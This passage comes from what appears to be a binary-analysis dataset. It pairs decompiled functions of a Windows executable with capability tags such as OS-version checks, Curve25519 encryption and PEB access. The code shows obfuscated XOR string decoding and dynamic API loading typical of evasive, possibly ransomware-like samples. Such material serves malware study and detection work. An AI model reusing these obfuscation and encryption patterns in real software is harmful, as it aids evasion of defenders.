uVar28;\n    uint32_t uVar29;\n    \n    fcn.00403560(0x406014, 0xe, 0x41001c, 10);\n    fcn.00403560(0x406014, 0xe, 0x410028, 0x12);\n    fcn.00403560(0x406014, 0xe, 0x41003c, 4);\n    fcn.00403560(0x406014, 0xe, 0x410040, 0xc);\n    fcn.00403560(0x406014, 0xe, 0x41004c, 7);\n    fcn.00403560(0x406014, 0xe, 0x410054, 0xb);\n    fcn.00403560(0x406014, 0xe, 0x410060, 0xc);\n    bVar20 = false;\n    uVar29 = 0x4039e0;\n    uVar3 = fcn.00403560(0x406014, 0xe, 0x41006c, 8);\n    if ((bVar20) || (uVar29 = uVar29 & 0xffff | unaff_EDI << 0x10,  !bVar20)) {\n        uVar29 = 0xd;\n    }\n    cVar4 = uVar3 - *unaff_EDI;\n    uVar24 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar4) & 1U) == 0) * 4 |\n             uVar3 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    puVar17 = unaff_ESI + -1;\n    iVar6 = func_0x1018996a(uVar24, uVar29);\n    bVar20 = (POPCOUNT(*(iVar6 + -0x7f + unaff_EBX) & 0x4b) & 1U) == 0;\n    uVar27 = 0x410074;\n    uVar29 = 0x403a0b;\n    uVar25 = fcn.00403560(0x406014, 0xe, 0x410074, uVar24);\n    pcVar7 = uVar25 >> 0x20;\n    iVar6 = uVar25;\n    if ((bVar20) || (uVar29 = uVar29 & 0xffff | puVar17 * 0x10000,  !bVar20)) {\n        uVar29 = 0x18;\n        in_stack_ffffffc8 = 0x410084;\n    }\n    else {\n        out(*puVar17, uVar25 >> 0x20);\n        do {\n            cVar4 = iVar6 >> 8;\n            in_AF = 9 < (iVar6 & 0xf) | in_AF;\n            iVar6 = CONCAT31(CONCAT21(iVar6 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar7);\n        puVar2 = unaff_EDI + 1 + pcVar7 * 2;\n        uVar24 = *puVar2;\n        uVar18 = *puVar2;\n        *puVar2 = (uVar18 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x6a) = iVar6;\n        *(iVar6 + -0x7c) = (*(iVar6 + -0x7c) - (extraout_ECX >> 8)) - (uVar24 < 0xffffff85 || uVar18 + 0x7b < in_AF);\n        *extraout_ECX = *extraout_ECX + -in_AF;\n        puVar17 = unaff_ESI + 3;\n    }\n    fcn.00403560(0x406014, 0xe, in_stack_ffffffc8, uVar29);\n    fcn.00403560(0x406014, 0xe, 0x41009c, 0x25);\n    fcn.00403560(0x406014, 0xe, 0x4100c4, 10);\n    uVar3 = fcn.00403560(0x406014, 0xe, 0x4100d0, 0xc);\n    uVar21 = 0;\n    bVar20 = (uVar3 ^ 0xca) < '\\0';\n    uVar22 = (uVar3 ^ 0xca) == 0;\n    uVar28 = 0x403aed;\n    cVar4 = fcn.00403560(0x406014, 0xe, 0x4100dc, 0xd);\n    if ((bVar20) || (!bVar20)) {\n        uVar28 = 6;\n        uVar27 = 0x4100ec;\n    }\n    else {\n        uVar21 = CARRY1(*extraout_ECX_00, cVar4 + 0x6aU);\n        *extraout_ECX_00 = *extraout_ECX_00 + cVar4 + 0x6aU;\n        uVar22 = *extraout_ECX_00 == 0;\n    }\n    uVar25 = fcn.00403560(0x406014, 0xe, uVar27, uVar28);\n    puVar15 = uVar25;\n    if (!uVar21 && !uVar22) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    *(unaff_EDI + 1) = *puVar17;\n    pcVar7 = (uVar25 >> 0x20) + 0xe;\n    *pcVar7 = *pcVar7 + extraout_CH;\n    puVar15[-1] = 0x406014;\n    puVar15[-2] = 0x403b3b;\n    fcn.00403560(puVar15[-1], *puVar15, puVar15[1], puVar15[2]);\n    puVar15[10] = extraout_ECX_01;\n    *(puVar15 + 0x26) = extraout_DX;\n    puVar15[10] = 0xd;\n    puVar15[9] = 0x4100fc;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403b65;\n    fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar15[10] = extraout_ECX_02;\n    puVar15[10] = 0x19;\n    puVar15[9] = 0x41010c;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403b99;\n    fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar15[10] = extraout_ECX_03;\n    *(puVar15 + 0x26) = extraout_DX_00;\n    puVar15[10] = 0xf;\n    puVar15[9] = 0x410128;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403bc3;\n    fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar15[10] = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n    uVar24 = puVar15[10];\n    puVar15[10] = 0xe;\n    puVar15[9] = 0x410138;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403be4;\n    fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar15[10] = extraout_EDX;\n    puVar15[9] = unaff_EDI + 5;\n    uVar18 = puVar15[9];\n    puVar15[10] = 0xd;\n    puVar15[9] = 0x410148;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403c18;\n    uVar27 = fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar15[10] = uVar27;\n    puVar15[10] = 0xc;\n    puVar15[9] = 0x410158;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403c34;\n    fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar15[6] = 0xf;\n    puVar15[5] = 0x410164;\n    puVar15[4] = 0xe;\n    puVar15[3] = 0x406014;\n    puVar15[2] = 0x403c59;\n    Var26 = fcn.00403560(puVar15[3], puVar15[4], puVar15[5], puVar15[6]);\n    uVar29 = Var26;\n    *(puVar15 + 0x2a) = uVar24;\n    *(puVar15 + 10) = Var26 >> 0x20;\n    puVar15[9] = uVar29;\n    bVar20 = uVar29 < 0x6e32;\n    bVar23 = uVar29 == 0x6e32;\n    uVar29 = uVar24 & 0xffff0000 | *(puVar15 + 0x2a);\n    puVar15[10] = 0xb;\n    puVar15[9] = 0x410174;\n    puVar15[8] = 0xe;\n    puVar15[7] = 0x406014;\n    puVar15[6] = 0x403c91;\n    fcn.00403560(puVar15[7], puVar15[8], puVar15[9], puVar15[10]);\n    puVar10 = puVar15 + 7;\n    if ((!bVar20 && !bVar23) && (puVar10 = puVar15 + 7,  bVar20 || bVar23)) {\n        puVar10 = puVar15 + 8;\n    }\n    puVar10[-1] = 0xb;\n    puVar10[-2] = 0x410180;\n    puVar10[-3] = 0xe;\n    puVar10[-4] = 0x406014;\n    puVar10[-5] = 0x403cb5;\n    fcn.00403560(puVar10[-4], puVar10[-3], puVar10[-2], puVar10[-1]);\n    if ((!bVar20) && (bVar20)) {\n        uVar29 = uVar29 + *(uVar29 + 0x69 + extraout_EDX_00 * 4) + bVar20;\n    }\n    puVar10[-5] = 0xb;\n    puVar10[-6] = 0x41018c;\n    puVar10[-7] = 0xe;\n    puVar10[-8] = 0x406014;\n    puVar10[-9] = 0x403cdf;\n    uVar5 = fcn.00403560(puVar10[-8], puVar10[-7], puVar10[-6], puVar10[-5]);\n    puVar10[3] = extraout_EDX_01;\n    *(puVar10 + 10) = uVar5;\n    puVar10[3] = 10;\n    puVar10[2] = 0x410198;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403d0f;\n    uVar27 = fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    puVar10[3] = uVar27;\n    *(puVar10 + 10) = uVar29;\n    uVar8 = *(puVar10 + 10);\n    puVar10[3] = 0xc;\n    puVar10[2] = 0x4101a4;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403d3d;\n    uVar5 = fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    *(puVar10 + 0xe) = uVar5;\n    *(puVar10 + 3) = extraout_ECX_04;\n    *(puVar10 + 10) = extraout_DX_01;\n    *(puVar10 + 2) = uVar8;\n    *(puVar10 + 6) = puVar10 + 0x10;\n    *(puVar10 + 1) = 0x81d0;\n    *(puVar10 + 2) = puVar17 + 1;\n    *puVar10 = uVar18;\n    puVar10[-1] = extraout_ECX_04;\n    uVar5 = *puVar10;\n    uVar16 = *(puVar10 + 2);\n    puVar15 = CONCAT22(0x6ae1, *(puVar10 + 1));\n    uVar9 = *(puVar10 + 2);\n    puVar10[3] = 0xe;\n    puVar10[2] = 0x4101b0;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403d5e;\n    fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    puVar10[3] = (uVar29 >> 8 & 0xffff00) << 8 | uVar9;\n    uVar28 = puVar10[3];\n    puVar10[3] = 0x11;\n    puVar10[2] = 0x4101c0;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403d79;\n    uVar27 = fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    *(puVar10 + 0xe) = uVar5;\n    *(puVar10 + 10) = uVar27;\n    *(puVar10 + 6) = extraout_ECX_05;\n    uVar9 = *(puVar10 + 0xe);\n    puVar10[3] = 0x13;\n    puVar10[2] = 0x4101d4;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403da4;\n    fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    puVar10[3] = uVar28;\n    bVar20 = (uVar28 & extraout_CX) == 0;\n    uVar29 = puVar10[3];\n    puVar10[3] = 0x14;\n    puVar10[2] = 0x4101e8;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403dbf;\n    fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    if ((!bVar20) && (bVar20)) {\n        puVar19 = puVar10 + -1;\n        puVar10[-1] = puVar15;\n        cVar4 = '\\x10';\n        do {\n            puVar15 = puVar15 + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *puVar15;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n        puVar10[-0x12] = puVar10 + -1;\n        puVar10 = puVar10 + -0x5e63;\n    }\n    puVar15 = uVar18 & 0xffff0000 | uVar9;\n    puVar10[-1] = 0x33;\n    puVar10[-2] = 0x4101fc;\n    puVar10[-3] = 0xe;\n    puVar10[-4] = 0x406014;\n    puVar10[-5] = 0x403de1;\n    uVar25 = fcn.00403560(puVar10[-4], puVar10[-3], puVar10[-2], puVar10[-1]);\n    puVar10[3] = uVar25;\n    puVar10[2] = extraout_ECX_06;\n    puVar10[1] = uVar25 >> 0x20;\n    puVar10[3] = 10;\n    puVar10[2] = 0x410230;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403e20;\n    Var26 = fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    *(puVar10 + 0xe) = uVar29;\n    *(puVar10 + 3) = Var26 >> 0x20;\n    puVar10[2] = Var26;\n    bVar20 = Var26 == 0x6e32;\n    uVar9 = *(puVar10 + 0xe);\n    uVar24 = uVar29 & 0xffff0000 | uVar9;\n    puVar10[3] = 4;\n    puVar10[2] = 0x41023c;\n    puVar10[1] = 0xe;\n    *puVar10 = 0x406014;\n    puVar10[-1] = 0x403e58;\n    uVar25 = fcn.00403560(*puVar10, puVar10[1], puVar10[2], puVar10[3]);\n    if (bVar20) {\ncode_r0x00403e76:\n        puVar11 = puVar10 + -1;\n        puVar10[-1] = 5;\ncode_r0x00403e6e:\n        puVar1 = (uVar25 >> 0x20) + 5;\n        bVar20 = false;\n        *puVar1 = *puVar1 ^ extraout_CH_00;\n        puVar11[-1] = 0x410240;\n        puVar11[-2] = 0xe;\n        puVar12 = puVar11 + -3;\n        puVar11[-3] = 0x406014;\n        puVar11[-4] = 0x403e89;\n        uVar3 = fcn.00403560(puVar11[-3], puVar11[-2], puVar11[-1], *puVar11);\n        if (bVar20) {\ncode_r0x00403ea1:\n            puVar12 = puVar11 + -4;\n            puVar11[-4] = 6;\n        }\n        else {\n            *(puVar11 + -0xe) = puVar15;\n            puVar15 = puVar15 & 0xffff0000 | *(puVar11 + -0xe);\n            if (!bVar20) goto code_r0x00403ea1;\n        }\n        cVar4 = uVar3 - *puVar15;\n        *(puVar12 + -4) =\n             (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar15) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar4) & 1U) == 0) * 4 |\n             uVar3 < *puVar15 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n        puVar13 = puVar12 + -8;\n        *(puVar12 + -8) = 0x403e9b;\n        func_0x10189e13();\n        puVar13[-1] = 0x410248;\n        puVar13[-2] = 0xe;\n        puVar13[-3] = 0x406014;\n        puVar13[-4] = 0x403eb4;\n        uVar5 = fcn.00403560(puVar13[-3], puVar13[-2], puVar13[-1], *puVar13);\n        *(puVar13 + 0x22) = uVar5;\n        *(puVar13 + 8) = extraout_ECX_07;\n        *(puVar13 + 0x1e) = extraout_DX_03;\n        *(puVar13 + 7) = uVar9;\n        *(puVar13 + 0x1a) = puVar13 + 0x24;\n        *(puVar13 + 6) = extraout_DX_02 + 6;\n        *(puVar13 + 0x16) = uVar16 - 1;\n        *(puVar13 + 5) = puVar15 + 1;\n        puVar13[4] = extraout_ECX_07;\n        bVar20 = false;\n        bVar23 = (extraout_ECX_07 >> 8 | 0x47) == 0;\n        uVar24 = uVar29 & 0xffff0000 | *(puVar13 + 7);\n        puVar13[8] = 0xc;\n        puVar13[7] = 0x410250;\n        puVar13[6] = 0xe;\n        puVar14 = puVar13 + 5;\n        puVar13[5] = 0x406014;\n        puVar13[4] = 0x403ed5;\n        uVar27 = fcn.00403560(puVar13[5], puVar13[6], puVar13[7], puVar13[8]);\n        puVar17 = puVar13 + 5;\n        if ((bVar20 || bVar23) || (puVar13[4] = uVar27,  puVar17 = puVar13 + 5,  !bVar20 && !bVar23))\n        goto code_r0x00403eec;\n    }\n    else {\n        puVar10[-1] = puVar15;\n        puVar19 = puVar10[-1];\n        puVar15 = puVar19;\n        if (!bVar20) goto code_r0x00403e76;\n        puVar15 = puVar19 + 1;\n        uVar27 = in(uVar25 >> 0x20);\n        *puVar19 = uVar27;\n        puVar11 = puVar10 + -1;\n        puVar14 = puVar10 + -1;\n        if (0 < puVar10) goto code_r0x00403e6e;\n        *uVar25 = *uVar25 + uVar25;\n        pcVar7 = (puVar17 + 1 & 0xffff0000 | uVar16) - 0x26;\n        *pcVar7 = *pcVar7 + uVar9;\n    }\n    puVar17 = puVar14 + 3;\ncode_r0x00403eec:\n    puVar17[-1] = 0xc;\n    puVar17[-2] = 0x41025c;\n    puVar17[-3] = 0xe;\n    puVar17[-4] = 0x406014;\n    puVar17[-5] = 0x403eff;\n    fcn.00403560(puVar17[-4], puVar17[-3], puVar17[-2], puVar17[-1]);\n    puVar17[-5] = 0x2a;\n    puVar17[-6] = 0x410294;\n    puVar17[-7] = 0xe;\n    puVar17[-8] = 0x406014;\n    puVar17[-9] = 0x403f20;\n    fcn.00403560(puVar17[-8], puVar17[-7], puVar17[-6], puVar17[-5]);\n    puVar17[3] = uVar24;\n    puVar17[2] = extraout_EDX_02;\n    puVar17[3] = 0xb;\n    puVar17[2] = 0x4102c0;\n    puVar17[1] = 0xe;\n    *puVar17 = 0x406014;\n    puVar17[-1] = 0x403f41;\n    fcn.00403560(*puVar17, puVar17[1], puVar17[2], puVar17[3]);\n    puVar17[-1] = 0x41;\n    puVar17[-2] = 0x41031c;\n    puVar17[-3] = 0xe;\n    puVar17[-4] = 0x406014;\n    puVar17[-5] = 0x403f54;\n    fcn.00403560(puVar17[-4], puVar17[-3], puVar17[-2], puVar17[-1]);\n    puVar17[-5] = 0x33;\n    puVar17[-6] = 0x410360;\n    puVar17[-7] = 0xe;\n    puVar17[-8] = 0x406014;\n    puVar17[-9] = 0x403f67;\n    fcn.00403560(puVar17[-8], puVar17[-7], puVar17[-6], puVar17[-5]);\n    puVar17[-9] = 0x4b;\n    puVar17[-10] = 0x410394;\n    puVar17[-0xb] = 0xe;\n    puVar17[-0xc] = 0x406014;\n    puVar17[-0xd] = 0x403f7a;\n    fcn.00403560(puVar17[-0xc], puVar17[-0xb], puVar17[-10], puVar17[-9]);\n    puVar17[3] = 0x39;\n    puVar17[2] = 0x4103e0;\n    puVar17[1] = 0xe;\n    *puVar17 = 0x406014;\n    puVar17[-1] = 0x403f90;\n    fcn.00403560(*puVar17, puVar17[1], puVar17[2], puVar17[3]);\n    puVar17[-1] = 8;\n    puVar17[-2] = 0x41041c;\n    puVar17[-3] = 0xe;\n    puVar17[-4] = 0x406014;\n    puVar17[-5] = 0x403fa3;\n    fcn.00403560(puVar17[-4], puVar17[-3], puVar17[-2], puVar17[-1]);\n    puVar17[-5] = 0x14;\n    puVar17[-6] = 0x410424;\n    puVar17[-7] = 0xe;\n    puVar17[-8] = 0x406014;\n    puVar17[-9] = 0x403fb6;\n    fcn.00403560(puVar17[-8], puVar17[-7], puVar17[-6], puVar17[-5]);\n    return;\n}\n",
        "token_count": 7212
    },
    "00404810": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404810(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403120(0x80000002, 0x4101fc, 0x410248, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 131
    },
    "null": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004032f0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403418) overlaps instruction at (ram,0x00403417)\n// \n// WARNING: Removing unreachable block (ram,0x00403345)\n// WARNING: Removing unreachable block (ram,0x00403418)\n// WARNING: Removing unreachable block (ram,0x0040338f)\n// WARNING: Removing unreachable block (ram,0x00403310)\n// WARNING: Removing unreachable block (ram,0x004033d5)\n\nuint fcn.004032f0(void)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    code *pcVar2;\n    code *unaff_ESI;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    if (*0x41e554 != 0) {\n        return 1;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    piVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *0x41e544 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x41e544 == 0) {\n        return 0;\n    }\n    iVar1 = (*pcVar2)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*piVar3)();\n    if (iVar1 == 0) {\n        *0x41e54c = iVar1;\n        return 0;\n    }\n    *0x41e54c = iVar1;\n    if ((0 < iVar1) && (iVar1 < 1)) {\n        pcVar2 = pcVar2 + 1;\n        *(iVar1 + 0x6839da56) = *(iVar1 + 0x6839da56) ^ extraout_ECX;\n        *piVar3 = *unaff_ESI;\n        *extraout_ECX = *extraout_ECX + iVar1;\n        piVar3 = piVar3 + 1;\n    }\n    iVar1 = (*pcVar2)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *0x41e548 = (*piVar3)();\n    if (*0x41e548 == 0) {\n        return 0;\n    }\n    piVar4 = piVar3;\n    if ((-1 < *0x41e548) && (-1 >= *0x41e548)) {\n        out(0xc4, *0x41e548);\n        piVar4 = piVar3 + 1;\n        *piVar3 = *0x41e548;\n    }\n    *0x41e53c = (*piVar4)();\n    if (*0x41e53c == 0) {\n        return 0;\n    }\n    *0x41e540 = (*piVar4)();\n    if (*0x41e540 == 0) {\n        return 0;\n    }\n    *0x41e550 = (*piVar4)();\n    if (*0x41e550 != 0) {\n        *0x41e554 = 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 732
    },
    "00403fc0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040ca) overlaps instruction at (ram,0x004040c8)\n// \n\nvoid fcn.00403fc0(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint uVar6;\n    char extraout_CL;\n    char *extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    char extraout_DH;\n    ushort extraout_DX;\n    uint8_t uVar7;\n    uint8_t *unaff_EBX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint8_t uVar8;\n    uchar uVar9;\n    uint8_t in_AF;\n    bool in_ZF;\n    uchar in_SF;\n    uchar in_OF;\n    bool bVar10;\n    char cVar11;\n    ulong uVar12;\n    uint uVar13;\n    uint in_stack_ffffffdd;\n    uint arg_10h;\n    char *pcVar14;\n    int16_t iVar15;\n    ushort uVar16;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        in_OF = SCARRY4(&stack0xfffffff4, 1);\n        in_SF = &stack0xfffffff5 < 0;\n    }\n    cVar3 = fcn.00403560(0x406014, 0xe, 0x410008, 0x11);\n    if (!in_OF) {\n        if (in_OF) {\n            *unaff_EDI = *unaff_ESI;\n            in_SF = cVar3 + '\\x01' + *extraout_ECX < '\\0';\n            unaff_EDI = unaff_EDI + 1;\n            pcVar14 = extraout_ECX;\n            goto code_r0x00403ff4;\n        }\n    }\n    pcVar14 = 0xd;\n    in_stack_ffffffdd = 0x410268;\ncode_r0x00403ff4:\n    uVar13 = 0x404000;\n    uVar4 = fcn.00403560(0x406014, 0xe, in_stack_ffffffdd, pcVar14);\n    if ((in_SF) || (!in_SF)) {\n        uVar13 = 0x1a;\n    }\n    while( true ) {\n        puVar5 = uVar4 + 0xe40ce22a;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        fcn.00403560(0x406014, 0xe, 0x410278, uVar13);\n        fcn.00403560(0x406014, 0xe, 0x4102cc, 10);\n        fcn.00403560(0x406014, 0xe, 0x4102d8, 0xb);\n        fcn.00403560(0x406014, 0xe, 0x4102e4, 8);\n        fcn.00403560(0x406014, 0xe, 0x4102ec, 9);\n        bVar10 = false;\n        fcn.00403560(0x406014, 0xe, 0x4102f8, 9);\n        if ((bVar10) || (!bVar10)) {\n            uVar13 = 9;\n            in_stack_ffffffdd = 0x410304;\n        }\n        else {\n            *unaff_EDI = *puVar5;\n            puVar5 = uVar4 + 0xe40ce22e;\n            unaff_EDI = unaff_EDI + 1;\n            uVar13 = extraout_ECX_00;\n        }\n        fcn.00403560(0x406014, 0xe, in_stack_ffffffdd, uVar13);\n        fcn.00403560(0x406014, 0xe, 0x410310, 0xc);\n        cVar11 = SBORROW1(extraout_DH, extraout_CL);\n        cVar3 = extraout_DH - extraout_CL < '\\0';\n        bVar10 = extraout_DH == extraout_CL;\n        uVar13 = 0x406014;\n        uVar4 = fcn.00403560(0x406014, 0xe, 0x410438, 3);\n        if ((bVar10 || cVar11 != cVar3) || (!bVar10 && cVar11 == cVar3)) break;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        uVar8 = uVar4 + in_AF * '\\x06';\n        if (extraout_ECX_01 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uVar4 = uVar4 & 0xffff0000 | (CONCAT11((uVar4 >> 8) + in_AF, uVar8) & 0xff0f) & 0xffffff00 |\n                (uVar8 & 0xf) + pe_dos_header;\n    }\n    arg_10h = 0x41043c;\n    uVar13 = 0xe;\n    fcn.00403560(0x406014, 0xe, 0x41043c, 10);\n    fcn.00403560(0x406014, 0xe, 0x410448, 0x1b);\n    fcn.00403560(0x406014, 0xe, 0x410464, 0x12);\n    fcn.00403560(0x406014, 0xe, 0x410478, 0x40);\n    fcn.00403560(0x406014, 0xe, 0x4104b8, 0xc);\n    fcn.00403560(0x406014, 0xe, 0x4104c4, 0xb);\n    iVar15 = unaff_EDI;\n    uVar16 = unaff_EDI >> 0x10;\n    uVar7 = extraout_DX >> 8;\n    uVar8 = CARRY1(extraout_DX, uVar7);\n    uVar9 = (POPCOUNT(extraout_DX + uVar7) & 1U) == 0;\n    do {\n        uVar4 = 0x40426a;\n        uVar12 = fcn.00403560(0x406014, 0xe, 0x4104d0, 4);\n        pcVar14 = uVar12 >> 0x20;\n        uVar6 = uVar12;\n        if (uVar9) {\ncode_r0x00404281:\n            uVar4 = 4;\n            arg_10h = 0x4104d4;\n            uVar13 = 0xe;\n        }\n        else {\n            uVar4 = uVar4 & 0xffff | puVar5 << 0x10;\n            if (!uVar9) goto code_r0x00404281;\n            puVar2 = puVar5 + 1;\n            out(*puVar5, uVar12 >> 0x20);\n            uVar8 = in_AF;\n            do {\n                cVar3 = uVar6 >> 8;\n                uVar8 = 9 < (uVar6 & 0xf) | uVar8;\n                uVar6 = CONCAT31(CONCAT21(uVar6 >> 0x10, cVar3 - uVar8), -uVar8);\n                puVar5 = puVar2;\n                in_AF = uVar8;\n            } while (uVar8 || cVar3 == *pcVar14);\n        }\n        piVar1 = CONCAT22(uVar16, iVar15) + pcVar14 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - uVar8;\n        *(extraout_ECX_02 + 0x6a) = uVar6;\n        pcVar14[0xe] = pcVar14[0xe] + (extraout_ECX_02 + 1 >> 8);\n        fcn.00403560(0x406014, uVar13, arg_10h, uVar4);\n        cVar11 = '\\0';\n        uVar4 = iVar15 + 0x2562U & 0xffffff00 | iVar15 + 0x2562U | 0x4c | extraout_ECX_03;\n        cVar3 = uVar4 < 0;\n        bVar10 = uVar4 == 0;\n        uVar9 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n        iVar15 = 0x6014;\n        uVar16 = 0x40;\n        uVar8 = fcn.00403560(0x406014, 0x406014, 0x4104d8, 0xc);\n        if ((bVar10 || cVar11 != cVar3) || (!bVar10 && cVar11 == cVar3)) {\n            fcn.00403560(0x406014, 0xe, 0x4104e4, 4);\n            fcn.00403560(0x406014, 0x406014, 0x4104e8, 9);\n            fcn.00403560(0x406014, 0x406014, 0x4104f4, 0x16);\n            fcn.00403560(0x406014, 0x406014, 0x41050c, 7);\n            return;\n        }\n        uVar8 = 9 < (uVar8 & 0xf) | in_AF;\n        in_AF = uVar8;\n        if (extraout_ECX_04 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 2254
    },
    "00403560": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040353e) overlaps instruction at (ram,0x0040353d)\n// \n\nvoid __cdecl fcn.00403560(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t in_ECX;\n    int32_t iVar4;\n    char cVar5;\n    int32_t unaff_EBX;\n    uint32_t uVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    \n    uVar6 = 0;\n    bVar7 = false;\n    bVar8 = arg_14h == 0;\n    if (0 < arg_14h) {\n        do {\n            uVar2 = arg_14h;\n            if ((bVar8) || (!bVar8)) {\ncode_r0x00403586:\n                iVar4 = uVar6 % arg_ch;\n                in_ECX = in_ECX & 0xffffff00 | *(uVar6 + arg_10h) ^ *(iVar4 + arg_8h);\n                cVar5 = unaff_EBX >> 8;\n                bVar7 = cVar5 + '0' < '\\0';\n                if ((cVar5 != -0x30 && SCARRY1(cVar5, '0') == bVar7) && (cVar5 == -0x30 || SCARRY1(cVar5, '0') != bVar7)\n                   ) {\n                    uVar2 = 9 < (arg_8h & 0xf) | in_AF;\n                    uVar3 = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) + uVar2, arg_8h + uVar2 * '\\x06') & 0xff0f;\n                    if (in_ECX == 0) {\n                        *0x1ab9 = *0x1ab9 + unaff_EBX;\n                        while( true ) {\n                            *(uVar6 + arg_8h) = iVar4 + 'a';\n                            uVar6 = uVar6 + 1;\n                            if (arg_10h <= uVar6) break;\n                            iVar4 = 